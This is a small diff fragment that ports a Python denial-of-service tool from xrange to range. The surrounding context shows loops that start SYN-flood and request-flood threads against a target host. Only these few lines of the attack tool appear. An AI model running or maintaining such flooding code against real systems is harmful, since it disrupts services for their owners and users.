@@ -400,7 +400,7 @@ Example:
 			else:
 				ip = args.i
 			try:
-				for x in xrange(0,int(args.T)):
+				for x in range(0,int(args.T)):
 					thread=Synflood(tgt,ip,sock=synsock)
 					thread.setDaemon(True)
 					thread.start()
@@ -413,7 +413,7 @@ Example:
 		print (colored('[*] Start send request to: ','blue')+colored(tgt,'red'))
 		while 1:
 			try:
-				for x in xrange(int(args.T)):
+				for x in range(int(args.T)):
 					t=Requester(tgt)
 					t.setDaemon(True)
 					t.start()
